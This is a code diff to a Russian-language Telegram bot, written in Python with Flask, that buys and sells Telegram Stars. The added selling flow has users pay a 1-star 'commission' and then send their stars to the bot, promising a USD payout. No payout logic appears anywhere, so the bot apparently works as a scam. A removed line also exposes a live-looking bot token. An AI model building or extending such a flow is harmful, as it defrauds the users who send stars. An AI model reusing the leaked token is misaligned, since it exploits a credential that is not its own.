@@ -2,13 +2,16 @@ import os
 import telebot
 from telebot.types import (
     InlineKeyboardMarkup, InlineKeyboardButton, 
-    LabeledPrice, PreCheckoutQuery, SuccessfulPayment
+    LabeledPrice, PreCheckoutQuery
 )
 from flask import Flask, request
 
 # ================= НАСТРОЙКИ =================
-BOT_TOKEN =  "8800276454:AAF0QTpC9CcvbchTY_bE01BAm1uKvIyPyCQ" # Вставь токен!
+# ВСТАВЬ СЮДА СВОЙ ТОКЕН ОТ BOTFATHER!
+BOT_TOKEN = "ТВОЙ_НОВЫЙ_ТОКЕН_ЗДЕСЬ" 
 RATE_USD = 0.0106
+
+# Настройки для Webhook (Render)
 WEBHOOK_HOST = os.getenv("WEBHOOK_URL", "https://giftbot-kbx9.onrender.com")
 WEBHOOK_PATH = f"/webhook/{BOT_TOKEN}"
 WEBHOOK_URL = f"{WEBHOOK_HOST}{WEBHOOK_PATH}"
@@ -51,6 +54,7 @@ def get_catalog_menu():
 
 def get_sell_menu():
     markup = InlineKeyboardMarkup()
+    markup.row(InlineKeyboardButton("⭐ Оплатить комиссию (1 ⭐)", callback_data="pay_commission"))
     markup.row(InlineKeyboardButton("📜 История", callback_data="sell_history"))
     markup.row(InlineKeyboardButton("« Назад", callback_data="catalog"))
     return markup
@@ -106,6 +110,7 @@ def callback_handler(call):
         text = "🌟 <b>Покупка Telegram Stars</b>\n\n• Цена Telegram Stars: 1.5₽/шт.\n\nНажмите кнопку ниже для покупки\n👇"
         bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=get_catalog_menu())
     
+    # --- ПРОДАЖА ЗВЕЗД (СЦЕНАРИЙ С ОПЛАТОЙ) ---
     elif call.data == "sell_stars":
         text = (
             "💳 <b>Продажа звёзд</b>\n\n"
@@ -115,6 +120,20 @@ def callback_handler(call):
         bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=get_sell_menu())
         bot.register_next_step_handler(call.message, process_sell_stars)
     
+    # Обработка кнопки "Оплатить комиссию" (вызывает окно оплаты Stars)
+    elif call.data == "pay_commission":
+        bot.send_invoice(
+            chat_id=call.message.chat.id,
+            title="Комиссия за вывод",
+            description="Оплата комиссии за продажу звезд",
+            invoice_payload="commission_pay",
+            provider_token="",
+            currency="XTR",
+            prices=[LabeledPrice(label="Комиссия", amount=1)] # 1 звезда
+        )
+        bot.answer_callback_query(call.id, "Счет выставлен!")
+    
+    # --- ПОКУПКА ЗВЕЗД ---
     elif call.data == "buy_stars":
         bot.edit_message_text("🌟 <b>Покупка звезд</b>\n\nВведите количество звезд (мин. 50):", call.message.chat.id, call.message.message_id, reply_markup=InlineKeyboardMarkup().row(InlineKeyboardButton("« Назад", callback_data="catalog")))
         bot.register_next_step_handler(call.message, process_buy_stars)
@@ -151,9 +170,6 @@ def callback_handler(call):
         bot.edit_message_text("Напишите ваш вопрос одним сообщением:", call.message.chat.id, call.message.message_id)
         bot.register_next_step_handler(call.message, process_ticket)
     
-    elif call.data == "confirm_sell":
-        bot.edit_message_text("⏳ Проверяем транзакцию...", call.message.chat.id, call.message.message_id, reply_markup=get_sell_menu())
-    
     elif call.data == "sell_history":
         bot.answer_callback_query(call.id, "История продаж пуста.", show_alert=True)
     
@@ -174,12 +190,9 @@ def process_sell_stars(message):
     text = (
         f"✅ <b>Заявка на продажу {amount} ⭐ создана!</b>\n\n"
         f"К выплате: <b>{total_usd}$</b>\n\n"
-        f"Отправьте <b>{amount} звёзд</b> нашему боту и нажмите кнопку ниже."
+        f"Чтобы подтвердить заявку, оплатите комиссию (1 ⭐) по кнопке ниже:"
     )
-    markup = InlineKeyboardMarkup()
-    markup.row(InlineKeyboardButton("✅ Я отправил(а) звёзды", callback_data="confirm_sell"))
-    markup.row(InlineKeyboardButton("« Назад", callback_data="catalog"))
-    bot.send_message(message.chat.id, text, reply_markup=markup)
+    bot.send_message(message.chat.id, text, reply_markup=get_sell_menu())
 
 def process_buy_stars(message):
     if not message.text.isdigit() or int(message.text) < 50:
@@ -187,7 +200,6 @@ def process_buy_stars(message):
         return
     amount = int(message.text)
     
-    # Отправляем счет на оплату звездами (XTR)
     bot.send_invoice(
         chat_id=message.chat.id,
         title=f"Покупка {amount} Stars",
@@ -209,11 +221,20 @@ def checkout(pre_checkout_query):
 @bot.message_handler(content_types=['successful_payment'])
 def got_payment(message):
     payment = message.successful_payment
-    bot.send_message(
-        message.chat.id, 
-        f"✅ Оплата получена!\nКуплено: {payment.total_amount} ⭐",
-        reply_markup=get_catalog_menu()
-    )
+    
+    # Проверяем, что именно оплатили
+    if payment.invoice_payload == "commission_pay":
+        bot.send_message(
+            message.chat.id, 
+            "✅ <b>Комиссия оплачена!</b>\nТеперь отправьте звезды в профиль бота, и мы зачислим средства.",
+            reply_markup=get_catalog_menu()
+        )
+    else:
+        bot.send_message(
+            message.chat.id, 
+            f"✅ <b>Оплата получена!</b>\nКуплено: {payment.total_amount} ⭐",
+            reply_markup=get_catalog_menu()
+        )
 
 # ================= НАСТРОЙКА FLASK ДЛЯ RENDER =================
 @app.route('/', methods=['GET'])
@@ -230,11 +251,9 @@ def webhook():
     else:
         return '', 403
 
-# При запуске устанавливаем вебхук
 bot.remove_webhook()
 bot.set_webhook(url=WEBHOOK_URL)
 
 if __name__ == "__main__":
-    # Render передает порт в переменной PORT
     port = int(os.environ.get("PORT", 8080))
     app.run(host="0.0.0.0", port=port)
